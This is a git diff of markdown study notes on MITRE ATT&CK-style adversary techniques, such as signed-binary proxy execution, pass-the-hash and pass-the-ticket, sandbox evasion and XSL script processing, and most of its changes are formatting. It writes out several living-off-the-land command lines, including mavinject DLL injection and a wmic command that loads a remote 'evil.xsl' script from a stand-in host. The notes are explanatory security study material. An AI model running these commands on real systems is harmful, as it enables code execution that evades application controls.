 * Mavinject.exe can also be abused to perform import descriptor injection via its `/HMODULE` command-line parameter (ex. `mavinject.exe PID /HMODULE=BASE_ADDRESS PATH_DLL ORDINAL_NUMBER`)
   * This command would inject an import table entry consisting of the specified DLL into the module at the given base address
+
 <br>
 
 ## MMC
@@ -1778,12 +1943,14 @@ Adversaries may also abuse MMC to execute malicious .msc files
 * First create a malicious registry Class Identifier (CLSID) subkey, which uniquely identifies a Component Object Model class object
 * Then, adversaries may create custom consoles with the "Link to Web Address" snap-in that is linked to the malicious CLSID subkey
 * Once the .msc file is saved, adversaries may invoke the malicious CLSID payload with the following command: `mmc.exe -Embedding C:\path\to\test.msc`
-<hr>
 
+<br>
+<hr>
 
 # System Script Proxy Execution
 Adversaries may use trusted scripts, often signed with certificates, to proxy the execution of malicious files. Several Microsoft signed scripts that have been downloaded from Microsoft or are default on Windows installations can be used to proxy execution of other files.
 * This behavior may be abused by adversaries to execute malicious files that could bypass application control and signature validation on systems
+
 <br>
 
 ## PubPrn
@@ -1798,8 +1965,9 @@ Adversaries may abuse PubPrn to execute malicious payloads hosted on remote site
 
 In later versions of Windows (10+), PubPrn.vbs has been updated to prevent proxying execution from a remote site
 * This is done by limiting the protocol specified in the second parameter to `LDAP://`, vice the script: moniker which could be used to reference remote code via HTTP(S)
-<hr>
 
+<br>
+<hr>
 
 # Template Injection
 Adversaries may create or modify references in user document templates to conceal malicious code or force authentication attempts
@@ -1819,8 +1987,8 @@ Adversaries may also modify the `*\template` control word within an *.rtf* file 
   * However, adversaries may alter the bytes of an existing *.rtf* file to insert a template control word field to include a URL resource of a malicious payload
 
 This technique may also enable Forced Authentication by injecting a SMB/HTTPS (or other credential prompting) URL and triggering an authentication attempt
-<br>
 
+<br>
 <hr>
 
 # Traffic Signaling
@@ -1843,6 +2011,7 @@ On network devices, adversaries may use crafted packets to enable Network Device
 
 **Wake-on-LAN:** A hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it. Once the system is powered on, it may become a target for lateral movement
 * Adversaries may also use the Wake-on-LAN feature to turn on powered off systems
+
 <br>
 
 ## Port Knocking
@@ -1855,13 +2024,15 @@ This technique has been observed both for the dynamic opening of a listening por
 The observation of the signal packets to trigger the communication can be conducted through different methods
 * One means is to use the libpcap libraries to sniff for the packets in question
 * Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs
-<hr>
 
+<br>
+<hr>
 
 # Trusted Developer Utilities Proxy Execution
 Adversaries may take advantage of trusted developer utilities to proxy execution of malicious payloads
 * There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering
 * These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application control solutions
+
 <br>
 
 ## MSBuild
@@ -1872,6 +2043,8 @@ Adversaries may use MSBuild to proxy execution of code through a trusted Windows
 * The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# or Visual Basic code to be inserted into an XML project file
 * MSBuild will compile and execute the inline task
 * MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application control defenses that are configured to allow MSBuild.exe execution
+
+<br>
 <hr>
 
 # Unused/Unsupported Cloud Regions
@@ -1885,8 +2058,8 @@ A variation on this behavior takes advantage of differences in functionality acr
 * An adversary could utilize regions which do not support advanced detection services in order to avoid detection of their activity
 
 An example of adversary use of unused AWS regions is to mine cryptocurrency through Resource Hijacking, which can cost organizations substantial amounts of money over time depending on the processing power used
-<br>
 
+<br>
 <hr>
 
 # Use Alternate Authentication Material
@@ -1897,6 +2070,7 @@ Authentication processes generally require a valid identity (e.g., username) alo
 Caching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s)
 * Because the alternate authentication must be maintained by the system—either in memory or on disk—it may be at risk of being stolen through Credential Access techniques
 * By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors
+
 <br>
 
 ## Application Access Token
@@ -1923,9 +2097,10 @@ Compromised access tokens may be used as an initial step in compromising other s
 * If a token grants access to a victim’s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines
 * Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords
 * Access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow
+
 <br>
 
-## Pass the Hash (PTH)
+## Pass the Hash
 **Pass the hash (PTH):** A method of authenticating as a user without having access to the user's cleartext password
 * This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash
 
@@ -1936,9 +2111,10 @@ When performing PTH, valid password hashes for the account being used are captur
 Adversaries may also use stolen password hashes to "Overpass the Hash (OTH)"
 * Similar to PTH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket
   * This ticket can then be used to perform Pass the Ticket (PTT) attacks
+
 <br>
 
-## Pass the Ticket (PTT)
+## Pass the Ticket 
 **Pass the ticket (PTH):** A method of authenticating to a system using Kerberos tickets without having access to an account's password -- Kerberos authentication can be used as the first step to lateral movement to a remote system
 
 When preforming PTH, valid Kerberos tickets for Valid Accounts are captured by OS Credential Dumping
@@ -1951,6 +2127,7 @@ A **Golden Ticket** can be obtained for the domain using the Key Distribution Se
 
 Adversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys
 * For example, OTH involves using a NTLM password hash to authenticate as a user (i.e. Pass the Hash) while also using the password hash to create a valid Kerberos ticket
+
 <br>
 
 ## Web Session Cookie
@@ -1960,14 +2137,16 @@ Authentication cookies are commonly used in web applications, including cloud-ba
 * Cookies are often valid for an extended period of time, even if the web application is not actively used
 * After the cookie is obtained through Steal Web Session Cookie or Web Cookies, the adversary may then import the cookie into a browser they control and is then able to use the site or application as the user for as long as the session cookie is active
 
+<br>
 <hr>
 
 # Valid Accounts
 Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.
 
-In some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.[1]
+In some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account
 
-The overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.[2]
+The overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise
+
 <br>
 
 ## Default Account 
@@ -1976,12 +2155,14 @@ Default accounts are those that are built-into an OS, such as the Guest or Admin
 * Note: Default accounts are not limited to client machines, rather also include accounts that are preset for equipment such as network devices and computer applications whether they are internal, open source, or commercial
   * Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary
   * Attackers may also utilize publicly disclosed or stolen Private Keys or credential materials to legitimately connect to remote environments via Remote Services
+
 <br>
 
 ## Domain Account 
 Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain -- Domain accounts can cover users, administrators, and services
 
 Adversaries may compromise domain accounts, some with a high level of privileges, through various means such as OS Credential Dumping or password reuse, allowing access to privileged resources of the domain
+
 <br>
 
 ## Local Account 
@@ -1989,6 +2170,7 @@ Local accounts are those configured by an organization for use by users, remote 
 
 Local Accounts may also be abused to elevate privileges and harvest credentials through OS Credential Dumping
 * Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement
+
 <br>
 
 ## Cloud Account
@@ -2000,8 +2182,9 @@ Compromised credentials for cloud accounts can be used to harvest sensitive data
 * Compromise of federated cloud accounts may allow adversaries to more easily move laterally within an environment
 
 Once a cloud account is compromised, an adversary may perform Account Manipulation - for example, by adding Additional Cloud Roles - to maintain persistence and potentially escalate their privileges
-<hr>
 
+<br>
+<hr>
 
 # Virtualization/Sandbox Evasion
 Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox
@@ -2012,6 +2195,7 @@ Adversaries may employ various means to detect and avoid virtualization and anal
 Adversaries may use several methods to accomplish *Virtualization/Sandbox Evasion* such as checking for security monitoring tools or other system artifacts associated with analysis or virtualization
 * Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment
 * Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox 
+
 <br>
 
 ### System Checks
@@ -2032,6 +2216,7 @@ Other common checks may enumerate services running that are unique to these appl
 
 Hardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a VME
 * Adversaries may also query for specific readings from these devices
+
 <br>
 
 ### User Activity Based Checks
@@ -2042,9 +2227,10 @@ Adversaries may employ various user activity checks to detect and avoid virtuali
 
 Adversaries may search for user activity on the host based on variables such as the speed/frequency of mouse movements and clicks, browser history, cache, bookmarks, or number of files in common directories such as home or the desktop
 * Other methods may rely on specific user interaction with the system before the malicious code is activated, such as waiting for a document to close before activating a macro or waiting for a user to double click on an embedded image to activate
+
 <br>
 
-### Time Based Evasion
+### Time-Based Evasion
 Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include enumerating time-based properties, such as uptime or the system clock, as well as the use of timers or other triggers to avoid a  VME/sandbox, specifically those that are automated or only operate for a limited amount of time
 
 Adversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex: Scheduled Task/Job)
@@ -2057,6 +2243,7 @@ Benign commands or other operations may also be used to delay malware execution
 Adversaries may also use time as a metric to detect sandboxes and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time
 * Attackers may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function
 
+<br>
 <hr>
 
 # Weaken Encryption
@@ -2069,6 +2256,7 @@ Encryption can be used to protect transmitted network traffic to maintain its co
 Adversaries can compromise and manipulate devices that perform encryption of network traffic
 * Through behaviors such as *Modify System Image, Reduce Key Space, and Disable Crypto Hardware*, an adversary can negatively effect and/or eliminate a device’s ability to securely encrypt network traffic
   * This poses a greater risk of unauthorized disclosure and may help facilitate data manipulation, Credential Access, or Collection efforts 
+
 <br>
 
 ### Reduce Key Space
@@ -2076,6 +2264,7 @@ Adversaries can weaken the encryption software on a compromised network device b
 * As a result, adversaries dramatically reduce the amount of effort needed to decrypt the protected information without the key
 
 Adversaries may modify the key size used and other encryption parameters using specialized commands in a Network Device CLI introduced to the system through Modify System Image to change the configuration of the device 
+
 <br>
 
 ### Disable Crypto Hardware
@@ -2085,8 +2274,9 @@ Many network devices perform encryption on network traffic to secure transmissio
 * Often, these devices are equipped with special, dedicated encryption hardware to greatly increase the speed of the encryption process as well as to prevent malicious tampering
 * When an adversary takes control of such a device, they may disable the dedicated hardware, for example, through use of *Modify System Image*, forcing the use of software to perform encryption on general processors
   * This is typically used in conjunction with attacks to weaken the strength of the cipher in software (e.g., Reduce Key Space)
-<hr>
 
+<br>
+<hr>
 
 # XSL Script Processing
 Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files
@@ -2100,7 +2290,7 @@ Adversaries may abuse this functionality to execute arbitrary files while potent
 * Since the XSL file is valid XML, the adversary may call the same XSL file twice
 * When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension
 
-**Command-line examples:**
+### Command-line examples:
 
 * `msxsl.exe customers.xml script.xsl`
 * `msxsl.exe script.xsl script.xsl`
@@ -2111,7 +2301,7 @@ Another variation of this technique, dubbed "**Squiblytwo**", involves using Win
 * This technique can also execute local/remote scripts and, similar to its *Regsvr32/* "Squiblydoo" counterpart, leverages a trusted, built-in Windows tool
 * Adversaries may abuse any alias in Windows Management Instrumentation provided they utilize the `/FORMAT` switch
 
-**Command-line examples:**
+### Command-line examples
 
 * Local File: `wmic process list /FORMAT:evil.xsl`
 Remote File: `wmic os get /FORMAT:"https://example.com/evil.xsl"`
